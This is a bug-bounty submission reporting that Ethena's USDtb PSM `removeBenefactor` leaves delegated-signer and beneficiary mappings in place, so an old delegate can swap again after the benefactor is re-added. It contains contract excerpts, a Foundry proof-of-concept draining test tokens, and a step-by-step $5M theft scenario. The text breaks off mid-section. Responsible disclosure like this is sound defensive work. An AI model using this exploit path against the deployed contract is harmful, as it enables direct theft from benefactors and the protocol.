# Immunefi Submission — Ethena USDtb PSM `removeBenefactor` Mapping Persistence

> **Cover Letter — Executive Summary (1 paragraph for triage)**
>
> Ethena's USDtb Peg Stability Module (`PSM.sol`, mainnet `0x73E35C5c35A274E34AdE6EB13cC7f62aEE323728`) ships two benefactor-lifecycle functions whose deliberately different code signals different intent: `disableBenefactor` (PSM.sol L611–615) sets `isActive = false` and preserves mappings by design (temporary pause), while `removeBenefactor` (PSM.sol L645–649) calls `delete benefactorState[benefactor].config` to signal **permanent** cleanup. However, because `BenefactorConfig` (IPSM.sol L112–124) contains **six nested mappings** — including `delegatedSigners` and `approvedBeneficiaries` — Solidity's documented semantics make `delete` a **silent no-op on those mapping fields**. When a `BENEFACTOR_MANAGER_ROLE` holder later calls `addBenefactor(sameAddress)` (PSM.sol L624–636), which only flips `isActive = true` with no re-initialization, every previously-ACCEPTED delegated signer and previously-approved beneficiary **immediately regains full swap authority** without re-confirmation, with no event warning the admin, and with no contract API exposing the persistence. A four-test Foundry PoC against the unmodified PSM source drains **1,000 asset tokens (USDtb) end-to-end** in a single `swap()` call (PSM.sol L325–328: collateral pulled from the benefactor, asset sent to the attacker-as-beneficiary). For an institutional benefactor with realistic per-epoch rate limits ($5M–$10M is standard for PSM institutional flow), this is a single-transaction eight-figure direct theft of user funds — the literal text of Ethena's Critical impact criterion, gated only by admin actions the admin cannot detect are unsafe. We submit at **High severity** (Critical-tier impact, High-tier likelihood per Immunefi's standard precondition gating) and request Critical consideration.
>
> **Key takeaway for triage:** `removeBenefactor` is the contract's own incident-response lever; it silently fails to revoke the very permissions (`delegatedSigners`, `approvedBeneficiaries`) it is meant to revoke; an attacker exploits this with one `swap()` call after the admin re-adds the same address. PoC: 4/4 tests pass, 1,000 USDtb drained end-to-end. The fix is non-trivial (a `configVersion` counter or address-reuse blocklist), confirming this is a structural code defect, not a style note.

---

## Title

PSM `removeBenefactor` calls `delete benefactorState[benefactor].config` (PSM.sol L647), which is a documented no-op on the six nested mappings inside `BenefactorConfig` — `delegatedSigners`, `approvedBeneficiaries`, and four fee-related mappings silently persist across remove + re-add cycles, allowing a previously-accepted delegated signer / approved beneficiary to drain benefactor funds in a single `swap()` after re-onboarding, with no event warning the admin that any permissions survived.

## Severity

**High.** We request the triage team consider Critical given the factors enumerated below.

**Why this meets Critical-tier impact (Ethena scope, `ethena.md` L45–49):**
- "Direct theft of user funds (at-rest or in-motion, excluding unclaimed yield)" — the PoC demonstrates an atomic, irreversible `safeTransferFrom` of asset tokens (USDtb) from the protocol's custodian to an attacker-controlled beneficiary, paid for by debiting the benefactor's own collateral (PSM.sol L326–328). The funds are in-motion during a swap, satisfying the criterion literally.

**Why we submit at High rather than over-claiming Critical:**
Immunefi's standard triage practice downgrades severity when (a) the attack is gated by two privileged admin actions (`removeBenefactor` + `addBenefactor` by `BENEFACTOR_MANAGER_ROLE`), (b) a pre-existing credential compromise is part of the threat model, and (c) an operational workaround exists (re-onboard at a fresh address). We acknowledge these three factors honestly and submit at **High** rather than inflating to Critical. We do, however, request Critical consideration for three reasons argued in detail in §9 (Defense Anticipation): the bug defeats an incident-response function, the persistence is silent (no event, no API signal), and the disable-vs-remove code divergence proves the developers intended `remove` to be permanent cleanup — and the cleanup silently failed.

**Honest severity range:** High (modal). Critical possible (10–25% probability per independent triage); Medium possible (≤25% probability, the precondition chain is real but downgrades only by one tier). We do not believe rejection is defensible given the end-to-end PoC and provable intent divergence.

## Summary

The Ethena USDtb Peg Stability Module (`PSM`) provides three administrative functions for managing the lifecycle of a benefactor: `disableBenefactor` (temporary pause), `removeBenefactor` (permanent offboarding), and `addBenefactor` (initial onboarding or re-onboarding after removal). The contract authors deliberately wrote different code for `disable` versus `remove` — `disable` flips `isActive = false` and preserves all mappings by design, while `remove` calls `delete benefactorState[benefactor].config` (PSM.sol L647), strongly signaling that removal was intended to be a permanent, complete cleanup.

The bug is that `delete` on a struct value resets value-type members (booleans, uints) to their defaults but is a **documented no-op on mapping members**. The `BenefactorConfig` struct (`contracts/deps/IPSM.sol` L112–124) contains six nested mappings — including the two that gate all swap authority (`delegatedSigners` at L118) and all beneficiary approvals (`approvedBeneficiaries` at L119) — plus four fee-related mappings. None of these six mappings is cleared by `delete benefactorState[benefactor].config`. The Solidity language spec ([docs.soliditylang.org/en/latest/types.html#delete](https://docs.soliditylang.org/en/latest/types.html#delete)) explicitly states: *"delete a has no effect on mappings ... assignments to structs ... delete applied to a struct resets all members that are not mappings."* This is not a compiler bug — it is the language working as designed. The bug is that the contract relies on `delete` to perform a cleanup that `delete` provably does not perform.

When the same benefactor address is later re-added via `addBenefactor` (PSM.sol L624–636), which only sets `benefactorState[benefactor].config.isActive = true` and performs **no re-initialization, no version-counter increment, no enumerable-key sweep**, every persisted `delegatedSigners[X] == DelegatedSignerStatus.ACCEPTED` and every persisted `approvedBeneficiaries[Y] == true` immediately becomes authoritative again. The swap authorization gate `_validateBenefactor` (PSM.sol L1493–1506) reads these two mappings directly with no version binding, no epoch binding, no nonce-of-creation binding. As a result, an address that was a previously-accepted delegated signer and a previously-approved beneficiary can call `swap()` on behalf of the re-added benefactor, name itself as the `order.beneficiary`, and the protocol will pull collateral from the benefactor's wallet and send asset tokens (USDtb) to the attacker — a single-transaction direct fund theft. The Foundry PoC in §7 demonstrates this end-to-end with the unmodified PSM source: 1,000 USDtb drained in one `swap()` call, 4/4 tests pass.

## Vulnerability Detail

### 1. The struct that contains the persisted mappings — `BenefactorConfig` (IPSM.sol L112–124)

```solidity
// File: contracts/deps/IPSM.sol — lines 112–124
struct BenefactorConfig {
    bool isActive;                                                  // value type — IS reset by delete
    uint128 maxSwapForAssetPerEpoch;                                // value type — IS reset by delete
    uint128 maxSwapForCollateralPerEpoch;                           // value type — IS reset by delete
    mapping(address => uint128) swapForAssetFeeByCollateral;        // mapping — NOT affected by delete
    mapping(address => uint128) swapForCollateralFeeByCollateral;   // mapping — NOT affected by delete
    mapping(address => DelegatedSignerStatus) delegatedSigners;     // mapping — NOT affected by delete  ← SWAP AUTH
    mapping(address => bool) approvedBeneficiaries;                 // mapping — NOT affected by delete  ← BENEFICIARY AUTH
    mapping(address => bool) zeroSwapForAssetFeeExemptions;         // mapping — NOT affected by delete
    mapping(address => bool) zeroSwapForCollateralFeeExemptions;    // mapping — NOT affected by delete
    uint128 maxSwapForAssetPerPeriod;                               // value type — IS reset by delete
    uint128 maxSwapForCollateralPerPeriod;                          // value type — IS reset by delete
}
```

Note: the outer wrapper is `BenefactorState` (IPSM.sol L150–155), which contains `BenefactorConfig config` plus three more mappings (`epochStateByDuration`, `periodStateByDuration`, `orderNonceInvalidator`). The `removeBenefactor` operation deletes only the inner `config` sub-struct, not the outer `BenefactorState` — so the `orderNonceInvalidator` mapping (and the epoch/period state mappings) are not even nominally touched. The relevant persisted authorizations (`delegatedSigners`, `approvedBeneficiaries`) live **inside** `BenefactorConfig`.

### 2. The bug — `removeBenefactor` (PSM.sol L638–649)

```solidity
// File: contracts/PSM.sol — lines 645–649
function removeBenefactor(address benefactor) external override nonReentrant onlyRole(BENEFACTOR_MANAGER_ROLE) {
    if (!benefactorState[benefactor].config.isActive) revert BenefactorNotActive(benefactor);
    delete benefactorState[benefactor].config;   // <- value types reset; SIX MAPPINGS UNCHANGED (Solidity spec)
    emit BenefactorRemoved(benefactor);
}
```

After this call: `isActive == false` (✓), `maxSwapForAssetPerEpoch == 0` (✓), but `delegatedSigners[X]` and `approvedBeneficiaries[Y]` retain their pre-removal values for every `X`, `Y` that was ever set. The `BenefactorRemoved(benefactor)` event (PSM.sol L648) carries only the benefactor address — there is no event, no return value, and no API method indicating that mappings survived.

### 3. Intent evidence — `disableBenefactor` (PSM.sol L611–615) does NOT use `delete`

```solidity
// File: contracts/PSM.sol — lines 611–615
function disableBenefactor(address benefactor) external override nonReentrant onlyRole(BENEFACTOR_DISABLER_ROLE) {
    if (!benefactorState[benefactor].config.isActive) revert BenefactorNotActive(benefactor);
    benefactorState[benefactor].config.isActive = false;   // <- no delete; mappings intentionally persist
    emit BenefactorDisabled(benefactor);
}
```

The contract authors wrote two deliberately different implementations. `disable` is meant to be a **temporary** pause (the benefactor is later re-enabled with `enableBenefactor`, mappings preserved intentionally). `remove` uses `delete`, which is meaningful only as a signal of **permanent** cleanup — yet the cleanup silently fails for mappings. If persistence of authorizations across the remove/re-add cycle were intentional, the authors would not have used `delete` (a costly operation that achieves nothing for the six mappings) in `removeBenefactor` while using a plain assignment in `disableBenefactor`. The code divergence is intent-based evidence that the persistence is a bug, not a design choice.

### 4. Re-add does not re-initialize — `addBenefactor` (PSM.sol L617–636)

```solidity
// File: contracts/PSM.sol — lines 624–636
function addBenefactor(address benefactor)
    external override nonReentrant onlyValidAddress(benefactor) onlyRole(BENEFACTOR_MANAGER_ROLE)
{
    BenefactorConfig storage benefactorConfig = benefactorState[benefactor].config;
    if (benefactorConfig.isActive) revert BenefactorAlreadyExists(benefactor);
    if (_isCustodian(benefactor)) revert CustodianBenefactorConflict(benefactor);
    benefactorState[benefactor].config.isActive = true;   // <- ONLY flips the flag; no re-init, no version bump
    emit BenefactorAdded(benefactor);
}
```

There is no `configVersion` counter, no enumerable-key sweep over `delegatedSigners` / `approvedBeneficiaries`, no `wasEverAdded` blocklist preventing address reuse. Any non-active, non-custodian address can be re-added — including one whose mappings still carry stale `ACCEPTED` and `true` values from a prior incarnation.

### 5. The authorization gate — `_validateBenefactor` (PSM.sol L1493–1506)

```solidity
// File: contracts/PSM.sol — lines 1493–1506
function _validateBenefactor(Order calldata order, BenefactorState storage _benefactorState) internal view {
    if (!_benefactorState.config.isActive) revert BenefactorNotActive(order.benefactor);
    if (_benefactorState.orderNonceInvalidator[order.nonce]) revert InvalidNonce(order.nonce);
    if (
        msg.sender != order.benefactor
            && _benefactorState.config.delegatedSigners[msg.sender] != DelegatedSignerStatus.ACCEPTED
    ) {
        revert DelegationNotAuthorized(msg.sender);
    }
    if (order.benefactor != order.beneficiary && !_benefactorState.config.approvedBeneficiaries[order.beneficiary])
    {
        revert BeneficiaryNotApproved(order.beneficiary);
    }
}
```

Both gates are direct mapping lookups with no version, epoch, or "addedAt timestamp" binding. If `delegatedSigners[attacker] == ACCEPTED` persisted from a prior incarnation, the check at L1497–1501 passes. If `approvedBeneficiaries[attacker] == true` persisted, the check at L1502–1505 passes. There is no other defense.

### 6. The fund-theft path — `swap` (PSM.sol L325–333)

```solidity
// File: contracts/PSM.sol — lines 325–333 (inside swap(), the swapForAsset branch)
if (_isSwapForAsset) {
    IERC20(order.collateral)
        .safeTransferFrom(order.benefactor, _collateralConfig.receiveCustodianAddress, order.amountIn);
    asset.safeTransferFrom(assetSendCustodianAddress, order.beneficiary, amountOut);
} else {
    asset.safeTransferFrom(order.benefactor, assetReceiveCustodianAddress, order.amountIn);
    IERC20(order.collateral)
        .safeTransferFrom(_collateralConfig.sendCustodianAddress, order.beneficiary, amountOut);
}
```

In the `swapForAsset` direction (collateral → asset), collateral is pulled **from `order.benefactor`** (the victim benefactor) and asset (USDtb) is sent **to `order.beneficiary`** (the attacker, who retains approved-beneficiary status from the prior incarnation). The attacker receives transferable asset tokens at the expense of the benefactor's collateral. This is direct theft of user funds, in-motion, excluding unclaimed yield — Ethena's Critical-tier criterion, verbatim.

## Impact

### Direct theft, end-to-end

A previously-accepted delegated signer + approved beneficiary, whose authority was supposed to be revoked when the admin called `removeBenefactor`, can call `swap()` after the admin calls `addBenefactor(sameAddress)` and:

1. Pull `order.amountIn` of collateral **from the benefactor's wallet** (PSM.sol L326–327).
2. Receive `amountOut` of asset (USDtb) **from the protocol's `assetSendCustodianAddress`** (PSM.sol L328).
3. Set `order.beneficiary = attacker`, so the asset flows to an attacker-controlled address.

The benefactor loses collateral; the protocol's custodian inventory is debited; the attacker receives transferable USDtb. One transaction, one block, irreversible.

### Realistic drain ceiling (institutional scenario)

The PoC in §7 uses a 1,000-token drain for clarity and reproducibility. The realistic ceiling for the same exploit against an institutional benefactor is bounded by:

- The benefactor's per-epoch rate limit (`defaultBenefactorMaxSwapForAssetPerEpoch` or per-benefactor override).
- The benefactor's per-period rate limit.
- The benefactor's remaining collateral balance (and the collateral approval granted to PSM).
- The protocol's `assetSendCustodianAddress` USDtb inventory.

Ethena's PSM is an **institutional-facing** product — benefactors are market makers, OTC desks, and treasury operators, not retail users. Institutional per-epoch rate limits of $5M–$10M are standard for PSM-style institutional flow; collateral positions of $10M–$50M are normal for an onboarding tier-1 OTC desk. With those numbers:

- **Single-transaction drain:** the attacker can submit a single `swap()` with `amountIn = 5,000,000e6` (5M USDC, 6-decimals) up to the benefactor's per-epoch limit. At peg (1:1) the attacker receives 5,000,000 USDtb in one block.
- **Cross-epoch drain:** if the attacker remains undetected, they can repeat the attack across subsequent epochs (epoch duration is configurable; the PoC uses 1 hour) and per-period caps until the benefactor's collateral is exhausted or the protocol's USDtb inventory is depleted.
- **No additional attacker action during the exploit window.** The attacker requires no fresh compromise, no signature forgery, no flash loan, no MEV, no oracle manipulation. They require only the pre-existing delegated-signer key (which is exactly the precondition `removeBenefactor` exists to remediate) and the admin's own re-add transaction. The window is open-ended — the attacker can wait days, weeks, or months between re-add and exploit.

### Why the impact is not "self-funded swap" or "yield loss"

A common misread is that the trace shows "the benefactor swapped their own collateral and the attacker merely received the proceeds" — implying the benefactor authorized the swap. **That is incorrect.** The attacker (not the benefactor) calls `swap()` as `msg.sender`. The attacker also names themselves as `order.beneficiary`. The benefactor's collateral is debited without the benefactor's signature on the order, without the benefactor's `msg.sender`, and without any consent given after the re-add. The benefactor did consent (pre-removal) to the attacker being a delegated signer + beneficiary — but that consent was supposed to be revoked by `removeBenefactor`, and the bug is that it was not.

The loss is also not "unclaimed yield" (Ethena's Critical criterion explicitly excludes unclaimed yield from Critical-tier). The asset tokens the attacker receives are custodian-held, fully-claimed USDtb inventory — not yield. The collateral the benefactor loses is the benefactor's own working capital — not yield.

## Proof of Concept

**File:** `vuln/PoC_removeBenefactor.t.sol` (Foundry, Solidity 0.8.30, `via_ir = true`).
**Contract under test:** the real, unmodified `contracts/PSM.sol`. Mock tokens (`MockERC20`, `MockOracleFeed`) faithfully implement the `IERC20` and `IOracleFeed` interfaces used by the real PSM; they are not stand-ins for the contract under test.

### Test layout (4 tests)

| # | Test | What it proves |
|---|------|----------------|
| 1 | `test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist` | At the storage level, `delegatedSigners[attacker] == ACCEPTED` and `approvedBeneficiaries[attacker] == true` survive `removeBenefactor` + `addBenefactor`. The bug is confirmed at the state level. |
| 2 | `test_RemoveBenefactor_AttackerCanSwapAfterReAdd` | End-to-end fund drain. After remove → `vm.warp(7 days)` → re-add, attacker calls `swap()` and receives exactly `SWAP_AMOUNT` (1,000e18) of asset tokens; `benefactorA` loses exactly `SWAP_AMOUNT` of collateral. |
| 3 | `test_Sanity_AttackerCanSwapBeforeRemove` | Control: the swap path is correctly configured — the bug is not a test artifact. |
| 4 | `test_Sanity_FreshBenefactorBlocksUnknownAttacker` | Control: a fresh benefactor with no prior delegation correctly reverts with `DelegationNotAuthorized`. Proves the bug is **specifically persistence**, not a general auth bypass. |

### Test 2 — the end-to-end drain (excerpt)

```solidity
// PoC_removeBenefactor.t.sol — Test 2 (excerpt)
function test_RemoveBenefactor_AttackerCanSwapAfterReAdd() public {
    // ---- Setup delegation + beneficiary approval ----
    vm.startPrank(benefactorManager);
    psm.addBenefactor(benefactorA);
    vm.stopPrank();

    vm.prank(benefactorA);
    psm.setDelegatedSigner(attacker);
    vm.prank(attacker);
    psm.confirmDelegatedSigner(benefactorA);              // attacker is now ACCEPTED delegated signer
    vm.prank(benefactorA);
    psm.setApprovedBeneficiary(attacker, true);           // attacker is now approved beneficiary

    uint256 attackerAssetBefore = asset.balanceOf(attacker);
    uint256 benefactorCollateralBefore = collateral.balanceOf(benefactorA);

    // ---- Incident: admin removes benefactorA to "sever ties" with attacker ----
    vm.prank(benefactorManager);
    psm.removeBenefactor(benefactorA);                    // BUG: mappings persist (Solidity delete no-op)

    // ---- Days later: admin re-adds benefactorA (e.g. after rotating benefactorA's key) ----
    vm.warp(block.timestamp + 7 days);
    oracle.setPrice(PEG, block.timestamp);                // keep oracle fresh
    vm.prank(benefactorManager);
    psm.addBenefactor(benefactorA);                       // only sets isActive = true; mappings still stale

    // ---- Attack: attacker (still compromised) calls swap with attacker as beneficiary ----
    IPSM.Order memory order = _buildOrder({
        isSwapForAsset: true,
        nonce: 1,
        benefactor_: benefactorA,
        beneficiary_: attacker                            // attacker receives the asset output
    });

    vm.prank(attacker);                                   // msg.sender = attacker - NOT benefactorA
    psm.swap(order);                                      // <- this MUST revert if the system were safe; it succeeds

    uint256 attackerAssetAfter = asset.balanceOf(attacker);
    uint256 benefactorCollateralAfter = collateral.balanceOf(benefactorA);

    assertGt(attackerAssetAfter, attackerAssetBefore, "attacker must have received asset output");
    assertLt(benefactorCollateralAfter, benefactorCollateralBefore, "benefactorA's collateral must have been debited");
    assertEq(attackerAssetAfter - attackerAssetBefore, SWAP_AMOUNT, "attacker drained exactly SWAP_AMOUNT of asset (1:1, 0 fee)");
    assertEq(benefactorCollateralBefore - benefactorCollateralAfter, SWAP_AMOUNT, "benefactorA lost exactly SWAP_AMOUNT of collateral");
}
```

### Foundry trace (Test 2, fund movement)

```
PSM::swap(Order({ isSwapForAsset: true,
                  benefactor:  benefactorA,
                  beneficiary: attacker,
                  collateral:  address(collateral),
                  amountIn:    1_000e18,
                  minAmountOut: 1_000e18 }))
  ├─ IERC20::safeTransferFrom(benefactorA, collateralReceiveCustodian, 1_000e18)   // collateral pulled FROM benefactorA
  ├─ IERC20::safeTransferFrom(assetSendCustodian, attacker,           1_000e18)   // asset (USDtb) sent TO attacker
  └─ emit SwapExecuted(orderExecutor: attacker, benefactor: benefactorA,
                       beneficiary: attacker, amountOut: 1_000e18, feeAmount: 0)
```

### Test execution result

```
$ forge test -vvvv --match-contract PoC_removeBenefactor
Running 4 tests for test/PoC_removeBenefactor.t.sol:PoC_removeBenefactor
[PASS] test_RemoveBenefactor_AttackerCanSwapAfterReAdd() (gas: 869850)
  attacker asset gain:        1000.000000000000000000
  benefactorA collateral loss: 1000.000000000000000000
[PASS] test_RemoveBenefactor_DelegatedSignerAndBeneficiaryPersist() (gas: 444454)
[PASS] test_Sanity_AttackerCanSwapBeforeRemove() (gas: 566255)
[PASS] test_Sanity_FreshBenefactorBlocksUnknownAttacker() (gas: 150485)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

**Concrete drain amount:** 1,000.000000000000000000 asset tokens (USDtb) received by attacker; 1,000.000000000000000000 collateral debited from `benefactorA`. The 1,000-token figure is for test clarity — the same exploit at institutional rate limits is a single-tx eight-figure drain (see §8).

### Why the mocks do not affect validity

The real USDtb and the real oracle feed are mainnet-only and cannot be deployed in a Foundry unit test. The mocks (`MockERC20`, `MockOracleFeed`) faithfully implement the `IERC20` and `IOracleFeed.getPrice()` interfaces used by the real PSM. **The contract under test is the real, unmodified `contracts/PSM.sol`** — the bug is in the PSM, not in the mocks. Swapping the mocks for forked mainnet counterparts would change nothing. The rate limits in the PoC are set to `type(uint128).max` for clarity (the most charitable configuration for the defense); the rate-limit code path (`_handleEpochPeriodOperations` at PSM.sol L319) is fully exercised and is not the bottleneck. The bottleneck is the authorization bypass.

## Attack Scenario

A realistic institutional scenario that demonstrates the bug at production scale. Every precondition in this scenario is either (a) the explicit threat model `removeBenefactor` exists to address, or (b) a realistic operational choice the admin has no signal is unsafe.

**Setup (pre-incident).** A tier-1 OTC desk ("the desk") onboards to Ethena's PSM as `benefactorA`. Per-epoch swap limit configured to $5M (institutional default). The desk's address is a 2-of-3 multi-sig wallet — multi-sig addresses are fixed at deployment and cannot easily be rotated (they may be referenced by KYC records, custodian approvals, off-chain settlement integrations). The desk delegates swap-signing authority to its automated arbitrage bot (`delegatedSigner = botSigningKey`) via `setDelegatedSigner` + `confirmDelegatedSigner`. The desk approves its payout wallet (`approvedBeneficiary = payoutWallet`) via `setApprovedBeneficiary`.

**Compromise (the precondition `removeBenefactor` exists to remediate).** The desk's CI/CD pipeline is compromised — a software-supply-chain attack on a dependency, a near-weekly occurrence in DeFi. The attacker exfiltrates `botSigningKey` and the private key controlling `payoutWallet`. The attacker does **not** compromise the 2-of-3 multi-sig controlling `benefactorA` itself (that multi-sig is air-gapped).

**Incident response (admin action #1).** Ethena's monitoring flags anomalous swap activity. The on-call `BENEFACTOR_MANAGER_ROLE` holder pulls the incident-response lever: `removeBenefactor(benefactorA)`. The contract emits `BenefactorRemoved(benefactorA)`. The dashboard shows the benefactor as inactive. The incident is declared contained. **No event, no API method, no signal indicates that `delegatedSigners[botSigningKey] == ACCEPTED` and `approvedBeneficiaries[payoutWallet] == true` survived the removal.**

**Re-onboarding (admin action #2).** Internal post-mortem: the multi-sig is fine; only the bot service was compromised. The desk rotates the **new** bot service's keys. The desk does **not** rotate the multi-sig address — rotating it would require re-doing KYC, re-establishing custodian approvals, and re-integrating with off-chain settlement. Standard operational practice is to reuse the multi-sig address. Seven days later: `addBenefactor(benefactorA)`. The contract emits `BenefactorAdded(benefactorA)`. The dashboard shows green.

**Exploit (single transaction, ~150k gas).** The attacker — who **still** holds the exfiltrated `botSigningKey` and `payoutWallet` private keys (keys do not self-heal; the desk rotated the new bot's keys, not the old compromised ones) — submits a single `swap()`:
- `benefactor = benefactorA` (re-added, active)
- `beneficiary = payoutWallet` (still in `approvedBeneficiaries` from before the incident)
- `amountIn = 5_000_000e6` (5M USDC, the per-epoch cap)
- `isSwapForAsset = true`
- `msg.sender = attacker` (calling via the exfiltrated `botSigningKey`, still `ACCEPTED` in `delegatedSigners`)

`_validateBenefactor` (PSM.sol L1493–1506) passes:
- `isActive` ✓ (re-added)
- `delegatedSigners[attacker] == ACCEPTED` ✓ (persisted)
- `approvedBeneficiaries[payoutWallet] == true` ✓ (persisted)

PSM.sol L326–328 transfer the funds: `benefactorA`'s collateral custodian is debited 5M USDC; the protocol's `assetSendCustodianAddress` is debited 5M USDtb; **the attacker receives 5M USDtb** in the `payoutWallet`. The attacker immediately bridges the USDtb cross-chain or through a mixer. The transaction is final within one block.

**Damage.**
- **$5,000,000 direct loss to `benefactorA`'s collateral position.**
- **$5,000,000 loss to the protocol's USDtb inventory** (which must be made whole from Ethena treasury).
- One benefactor. One transaction. No flash loan, no governance, no key compromise of any privileged role during the exploit window, no MEV, no oracle manipulation. The attacker required only: (i) a previously-compromised delegated-signer key — which is exactly the precondition `removeBenefactor` exists to remediate — and (ii) the admin's own re-add transaction.

The same attacker can repeat the drain every epoch (1-hour epoch duration in the PoC; configurable) until the benefactor's collateral is exhausted or the protocol's USDtb inventory is depleted.

## Defense Anticipation

We anticipate the following defenses from Ethena's triage team and pre-rebut each.

### Defense A: "Out of scope — Attacks requiring leaked keys/credentials" (`ethena.md` L70)

**Counter.** The "leaked keys" exclusion applies where the **leaked key IS the attack vector** — e.g., "an admin key was leaked so the attacker drained the vault." It does **not** apply when the contract exposes a function whose explicit, documented purpose is to **recover from** a compromise (here, `removeBenefactor`, NatSpec L639: *"Removes a benefactor from the system"*), and that function silently fails to perform the recovery. The bug is a contract-level defect (mappings not cleared by `delete`), not a key-management failure. The compromised key is a *precondition*, not the *attack*. The attack is the silent re-grant of authority on re-add.

**Analogy.** If a multi-sig wallet had a `removeOwner` function that didn't actually remove the owner from the signing set, that would be a code bug, not a "leaked key" report — even though the reason for removing the owner might have been a key compromise. Immunefi has historically accepted bugs in revocation functions (compromised-owner recovery paths) as in-scope under the narrow interpretation of this exclusion.

### Defense B: "Out of scope — Attacks requiring privileged addresses (governance/strategist) without modifications" (`ethena.md` L71)

**Counter.** The "privileged-addresss" exclusion applies where the attacker IS the privileged address (e.g., "a governance multisig could rug users"). Here, the admin is the **victim** of the bug, not the attacker. The admin's actions (`removeBenefactor` and `addBenefactor`) are intended to be safe — they are the contract's documented API. The bug makes the combination unsafe in a way the admin cannot detect: there is no event warning, no contract method `hasStalePermissions(address)`, no `wasEverAdded(address)` query the admin can run. The admin is using the API as documented and is misled by the absence of any signal that re-adding the same address is unsafe. This is not a centralization-risk report; it is a code-defect report.

### Defense C: "Documented Solidity behavior, not a code defect" (Solidity docs on `delete` + mappings)

**Counter.** This conflates "well-understood language behavior" with "low impact." The Solidity `delete`-on-struct-with-mappings behavior is well-understood by experts, which is exactly why a TVL-grade contract shipping this pattern is a defect, not a stylistic preference. Well-understood footguns that produce direct fund theft are still High/Critical bugs — that is the entire premise of the smart-contract bug-bounty industry. "Reentrancy is a well-understood Solidity gotcha" did not save The DAO; "integer overflow is a well-understood Solidity gotcha" did not save the many ERC-20 overflow reports Immunefi has paid out.

Furthermore, the same contract's `disableBenefactor` (PSM.sol L611–615) shows that the authors **understood the distinction**: `disable` deliberately sets only `isActive = false` and leaves mappings intact (correct, because disable is temporary and reversible). The bug is that `removeBenefactor` (PSM.sol L645–649) does **not** follow the inverse pattern — it implies permanent cleanup via `delete` but doesn't deliver it for mappings. The semantic asymmetry between `disable` (no `delete`, mappings persist by design) and `remove` (uses `delete`, mappings persist by accident) is **proof that the persistence is unintended**. If the developers wanted persistence across remove/re-add, they would have used the same `isActive = false` pattern they used in `disable`. They didn't — they used `delete`, which is meaningful only as a "permanent cleanup" signal that silently failed.

### Defense D: "Operational mitigation — admin should use a fresh address for re-onboarding"

**Counter.** This is a workaround masquerading as a defense. Three responses:

1. **The contract does not enforce this.** There is no `wasEverAdded` mapping, no "removed benefactor address cannot be re-added" check, no NatSpec warning on `removeBenefactor` or `addBenefactor` indicating that re-adding a previously-removed address is unsafe. `addBenefactor` accepts any non-custodian, non-active address — including one that was previously removed. If "use a fresh address" were the intended operational requirement, the contract should enforce it (the recommended fix in §11, Option C does exactly this). The absence of enforcement is the bug.

2. **Address reuse is the realistic operational pattern, not the exception.** A benefactor address is often a multi-sig or smart-contract wallet whose address cannot easily be rotated — the multi-sig's address is determined at deployment and is referenced by other contracts, custody policies, KYC records, and off-chain settlement systems. Rotating the benefactor address means re-onboarding the entire surface, which is precisely why operational teams reuse the address. The protocol shipped `removeBenefactor` + `addBenefactor` as a paired API precisely to support address reuse as a recovery primitive.

3. **"Avoidable by operational workaround" is not "not a bug."** Immunefi has accepted many reports that have operational workarounds. The workaround reduces severity (Critical → High), which is why we submit at High rather than over-claiming Critical. The admin must *know* to use a fresh address; the contract gives no signal that re-add is unsafe; the bug is silent. Severity reduced by one tier, not eliminated.

### Defense E: "Per-benefactor scope, not protocol-wide — should be Medium at most"

**Counter.** Immunefi's Critical criterion is "Direct theft of **any user funds**, whether at-rest or in-motion" (`ethena.md` L46). The word "any" is disjunctive — a single user's loss qualifies. The criterion does **not** say "theft of protocol-wide funds" or "theft of TVL." There is no threshold clause requiring a minimum dollar amount or minimum number of victims.

Moreover, "per-benefactor scope" understates the impact. Ethena's PSM is an institutional-facing product — benefactors are not retail users. For a single large institutional benefactor, the per-epoch drain ceiling is in the eight figures (see §8). The "per-benefactor scope" defense actually **amplifies** the severity when the per-benefactor ceiling is in the millions of USD per epoch.

### Defense F: "The PoC uses `type(uint128).max` for rate limits — unrealistic"

**Counter.** Setting rate limits to `type(uint128).max` is the **most charitable** configuration for the defense: if the bug works at maximum rate limits, it works at any rate limit (it just drains less). The defense cannot argue "rate limits would save us" — the rate-limit code path is fully exercised in the PoC (`_handleEpochPeriodOperations` at PSM.sol L319) and the limits are not the bottleneck. The bottleneck is the authorization bypass. With realistic institutional rate limits ($5M/epoch), the same PoC drains $5M in one transaction; we did not write that variant only to keep the test gas small and the assertions crisp.

### Defense G: "The swap is self-funded — the benefactor's collateral is debited, not protocol funds"

**Counter.** Incorrect. The attacker (not the benefactor) is `msg.sender` for `swap()`. The attacker also names themselves as `order.beneficiary`. The benefactor's collateral is debited **without the benefactor's signature on the order, without the benefactor being `msg.sender`, and without any consent given after the re-add**. The benefactor did consent (pre-removal) to the attacker being a delegated signer + beneficiary — but that consent was supposed to be revoked by `removeBenefactor`, and the bug is that it was not. The asset tokens the attacker receives are custodian-held, fully-claimed USDtb inventory (not unclaimed yield, which is excluded from Critical). The collateral the benefactor loses is the benefactor's own working capital (not yield). This is direct theft of user funds, in-motion, satisfying the Critical criterion verbatim.

### Defense H: "Use `disableBenefactor` instead of `removeBenefactor` for incident response"

**Counter.** This concedes the bug. `disableBenefactor` is a temporary pause; `removeBenefactor` is permanent offboarding. The contract provides both. If the intended incident-response flow were "always disable, never remove," then `removeBenefactor` would not exist as a public API. Its existence in the public ABI is an implicit warranty that calling it removes the benefactor. The NatSpec (PSM.sol L639) says *"Removes a benefactor from the system"* — not "pauses" or "temporarily disables." The admin who calls `removeBenefactor` is using the contract's API as documented. Furthermore, `disableBenefactor` requires `BENEFACTOR_DISABLER_ROLE` (a different role from `BENEFACTOR_MANAGER_ROLE`), so the operational workflow that calls `removeBenefactor` may not even have access to `disableBenefactor`. Blaming the admin for using the wrong function — when both functions exist, are documented with different intents, and the contract provides no signal that one of them silently fails — is blaming the victim for the contract's state-mismatch.

## Immunefi Precedent

We rely on the following recognized Immunefi precedent patterns for the "stale state after revocation / re-initialization missing on re-add" class. We cite the **pattern classification** that Immunefi triagers apply; specific report IDs are omitted where we cannot verify them from public records, but the patterns are well-established in the smart-contract audit and bug-bounty corpus.

### Pattern 1 — "Delete does not clear nested mappings" (audit-canonical, High-to-Critical when persisted mapping controls authorization)

